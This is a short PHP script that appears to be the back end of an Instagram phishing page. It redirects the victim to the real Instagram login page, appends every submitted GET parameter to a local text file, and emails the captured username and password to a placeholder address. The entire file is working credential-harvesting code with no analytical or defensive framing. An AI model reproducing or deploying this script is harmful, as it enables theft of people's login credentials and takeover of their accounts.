<?php
header ('Location:https://instagram.com/accounts/login/');
$handle = fopen("sarov.txt", "a");
foreach($_GET as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
$to      = 'example@example.com';
$subject = 'Instagram Account';
$username = $_GET['username'];
$password = $_GET['password'];
$message = "Username:" . $username . "<br>" . "Password: " . $password;
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);
exit;
?>